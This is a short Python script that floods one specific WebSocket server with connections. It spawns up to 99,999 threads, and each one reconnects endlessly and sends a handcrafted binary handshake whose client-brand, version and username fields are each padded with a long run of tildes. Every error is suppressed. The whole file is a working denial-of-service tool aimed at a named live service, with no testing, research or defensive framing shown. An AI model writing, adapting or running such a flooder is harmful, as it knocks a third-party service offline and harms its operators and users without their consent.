import asyncio
import websockets  # type: ignore
import threading
from concurrent.futures import ThreadPoolExecutor

# Define the WebSocket server URL
WEBSOCKET_URL = "wss://x.mess.eu.org/haumea/"

Username = "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"

# Define the binary message as a byte array
binary_message = bytes.fromhex(
    "01020003000200030004000100" +  # This is the header.
    "/".encode("utf-8").hex()    +  # This is a "/" in hex
    format(len(Username), '02X') +  # Length of BrandOfClient
    Username.encode("utf-8").hex() +  # BrandOfClient
    format(len(Username), '02X') +  # Length of VersionOfClient
    Username.encode("utf-8").hex() +  # VersionOfClient string to hex
    "00" +  # breakplace
    format(len(Username), '02X') +  # Length of Username
    Username.encode("utf-8").hex()  # Username
)

# Function to handle a single WebSocket connection
async def send_message():
    while True:  # Infinite loop to keep reconnecting
        try:
            async with websockets.connect(WEBSOCKET_URL) as websocket:
                await websocket.send(binary_message)
                try:
                    response = await websocket.recv()
                except:
                    pass

        except (websockets.exceptions.WebSocketException, asyncio.CancelledError) as e:
            pass

# Function to run the WebSocket client in a separate thread
def run_client():
    asyncio.run(send_message())

# Number of connections you want to create
num_connections = 99999  # Change this number as needed

# Set up a ThreadPoolExecutor to handle multiple WebSocket clients
with ThreadPoolExecutor(max_workers=num_connections) as executor:
    for _ in range(num_connections):
        executor.submit(run_client)
